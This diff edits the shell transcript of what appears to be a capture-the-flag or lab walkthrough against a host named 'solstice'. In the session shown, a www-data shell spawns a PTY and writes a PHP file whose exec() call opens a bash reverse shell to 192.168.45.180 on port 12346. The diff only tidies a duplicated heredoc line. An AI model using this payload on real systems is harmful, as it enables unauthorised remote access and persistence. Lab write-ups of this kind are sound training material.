@@ -509,7 +509,7 @@ www-data@solstice:/var/tmp/webserver$ python -c 'import pty;pty.spawn("/bin/bash
 www-data@solstice:/var/tmp/webserver$ cat > /var/tmp/sv/index.php << EOF
 cat > /var/tmp/sv/index.php << EOF
 > <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.180/12346 0>&1'"); ?>
-> EOF exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.180/12346 0>&1'"); ?> 
+> EOF
 EOF
 www-data@solstice:/var/tmp/webserver$ cat /var/tmp/sv/index.php
 cat /var/tmp/sv/index.php
